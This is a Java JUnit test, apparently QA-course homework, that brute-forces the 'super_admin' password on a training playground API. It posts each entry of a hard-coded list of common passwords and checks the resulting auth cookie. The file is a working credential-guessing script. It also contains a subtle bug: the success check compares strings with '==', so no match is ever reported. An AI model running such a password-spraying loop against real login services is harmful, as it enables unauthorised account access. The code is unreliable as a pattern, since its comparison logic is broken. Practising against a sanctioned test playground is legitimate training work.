import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class GetSecretPasswordHomework{
    @Test
    public void testGetSecretPasswordHomework(){
        List<String> passwords = Arrays.asList("password", "123456", "123456789", "12345", "12345678", "qwerty", "qwerty123", "qwertyuiop",	"abc123",
                "football",	"Football",	"monkey", "1234567", "111111", "letmein", "1234", "dragon", "baseball","trustno1",	"iloveyou",	"sunshine",
                "princess",	"123123", "adobe123", "welcome", "login", "admin", "1q2w3e4r", "1234567890", "solo", "666666", "1qaz2wsx", "master",
                "photoshop", "654321", "starwars", "121212", "ashley", "mustang", "shadow", "access", "flower", "555555", "lovely", "7777777",
                "bailey", "passw0rd", "hottie",	"michael", "superman", "!@#$%^&*", "hello",	"charlie", "jesus", "888888", "696969",	"qazwsx",
                "password1", "ninja", "000000", "aa123456", "freedom", "zaq1zaq1", "123qwe", "azerty", "batman", "loveme", "whatever", "donald", "qazwsx");


        for (int i = 0; i < passwords.size(); i++) {

            Map<String, String> data = new HashMap<>();
            data.put("login", "super_admin");
            data.put("password", passwords.get(i));

            Response responseAuth = RestAssured
                    .given()
                    .body(data)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();

            String responseCookies = responseAuth.getCookie("auth_cookie");

            Map<String,String> cookies = new HashMap<>();
            cookies.put("auth_cookie", responseCookies);

            Response responseCheck = RestAssured
                    .given()
                    .body(data)
                    .cookies(cookies)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();

            String request = responseCheck.print();
            if (request=="You are authorized") {
                System.out.println("You are authorized");
                System.out.println(passwords.get(i));
            }
        }
    }
}
